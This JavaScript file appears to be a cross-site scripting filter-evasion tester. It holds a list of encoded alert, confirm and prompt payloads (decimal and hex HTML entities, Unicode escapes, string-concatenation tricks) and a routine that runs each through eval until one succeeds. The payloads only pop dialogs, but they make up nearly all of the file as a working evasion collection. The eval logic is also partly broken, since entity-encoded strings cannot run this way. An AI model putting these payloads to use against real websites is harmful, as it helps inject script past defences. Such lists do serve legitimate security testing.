(function() {
    const payloads = [
        // alert(1) payloads starting
        'alert(1)',
        'al\u0065rt(3)',
        'alert&lpar;1&rpar;',
        'alert&#40;1&#41',
        '(alert)(1)',
        'a=alert,a(1)',
        '[1].find(alert)',
        'top["al"+"ert"](1)',
        'top[/al/.source+/ert/.source](1)',
        "top['al\145rt'](1)",
        'top[8680439..toString(30)](1)',
        // Add more payloads here

        // Decimal-Encoded-Payloads
        '&#97;lert(1)',
        'a&#108;ert(1)',
        'al&#101;rt(1)',
        'ale&#114;t(1)',
        'aler&#116;(1)',
        '&#97;&#108;&#101;&#114;&#116;(1)',

        // Decimal-Encoded-Payloads-Special-Characters
        'alert&#40;1&#41;',

        // HTML-Entity-Encoding
        '&#x61;lert(1)',
        'a&#x6c;ert(1)',
        'al&#x65;rt(1)',
        'ale&#x72;t(1)',
        'aler&#x74;(1)',
        '&#x61;&#x6c;&#x65;&#x72;&#x74;(1)',

        // HTML-Entity-Encoding-Special-Characters
        'alert&#x28;1&#x29;',

        // HTML-Hexadecimal-Entity-Encoding
        '&#x000061;lert(1)',
        'a&#x00006c;ert(1)',
        'al&#x000065;rt(1)',
        'ale&#x000072;t(1)',
        'aler&#x000074;(1)',
        '&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)',

        // HTML-Hexadecimal-Entity-Encoding-Special-Characters
        'alert&#x000028;1&#x000029;',

        // Unicode-Encoded-Payloads
        '\u0061lert(1)',
        'a\u006cert(1)',
        'al\u0065rt(1)',
        'ale\u0072t(1)',
        'aler\u0074(1)',
        '\u0061\u006c\u0065\u0072\u0074(1)',


        // confirm(1) payloads starting

        // Decimal-Encoded-Payloads
        '&#99;onfirm(1)',
        'c&#111;nfirm(1)',
        'co&#110;firm(1)',
        'con&#102;irm(1)',
        'conf&#105;rm(1)',
        'confi&#114;m(1)',
        'confir&#109;(1)',
        '&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)',

        // Decimal-Encoded-Payloads-Special-Characters
        'confirm&#40;1&#41;',

        // HTML-Entity-Encoding
        '&#x63;onfirm(1)',
        'c&#x6f;nfirm(1)',
        'co&#x6e;firm(1)',
        'con&#x66;irm(1)',
        'conf&#x69;rm(1)',
        'confi&#x72;m(1)',
        'confir&#x6d;(1)',
        '&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)',

        // HTML-Entity-Encoding-Special-Characters
        'confirm&#x28;1&#x29;',

        // HTML-Hexadecimal-Entity-Encoding
        '&#x000063;onfirm(1)',
        'c&#x00006f;nfirm(1)',
        'co&#x00006e;firm(1)',
        'con&#x000066;irm(1)',
        'conf&#x000069;rm(1)',
        'confi&#x000072;m(1)',
        'confir&#x00006d;(1)',
        '&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)',

        // HTML-Hexadecimal-Entity-Encoding-Special-Characters
        'confirm&#x000028;1&#x000029;',

        // Unicode-Encoded-Payloads
        '\u0063onfirm(1)',
        'c\u006fnfirm(1)',
        'co\u006efirm(1)',
        'con\u0066irm(1)',
        'conf\u0069rm(1)',
        'confi\u0072m(1)',
        'confir\u006d(1)',
        '\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)',


        // prompt(1) payloads starting

        // Decimal-Encoded-Payloads
        '&#112;rompt(1)',
        'p&#114;ompt(1)',
        'pr&#111;mpt(1)',
        'pro&#109;pt(1)',
        'prom&#112;t(1)',
        'promp&#116;(1)',
        '&#112;&#114;&#111;&#109;&#112;&#116;(1)',

        // Decimal-Encoded-Payloads-Special-Characters
        'prompt&#40;1&#41;',

        // HTML-Entity-Encoding
        '&#x70;rompt(1)',
        'p&#x72;ompt(1)',
        'pr&#x6f;mpt(1)',
        'pro&#x6d;pt(1)',
        'prom&#x70;t(1)',
        'promp&#x74;(1)',
        '&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)',

        // HTML-Entity-Encoding-Special-Characters
        'prompt&#x28;1&#x29;',

        // HTML-Hexadecimal-Entity-Encoding
        '&#x000070;rompt(1)',
        'p&#x000072;ompt(1)',
        'pr&#x00006f;mpt(1)',
        'pro&#x00006d;pt(1)',
        'prom&#x000070;t(1)',
        'promp&#x000074;(1)',
        '&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)',

        // HTML-Hexadecimal-Entity-Encoding-Special-Characters
        'prompt&#x000028;1&#x000029;',

        // Unicode-Encoded-Payloads
        '\u0070rompt(1)',
        'p\u0072ompt(1)',
        'pr\u006fmpt(1)',
        'pro\u006dpt(1)',
        'prom\u0070t(1)',
        'promp\u0074(1)',
        '\u0070\u0072\u006f\u006d\u0070\u0074(1)',

    ];

    let index = 0;

    function tryPayload() {
        if (index >= payloads.length) {
            console.log('None of the payloads triggered');
            return;
        }

        try {
            eval(payloads[index]);
            // If successful, you can exit or log a success message
            console.log(`Payload succeeded: ${payloads[index]}`);
        } catch (e) {
            // Move to the next payload if the current one fails
            index++;
            tryPayload();
        }
    }

    tryPayload();
})();
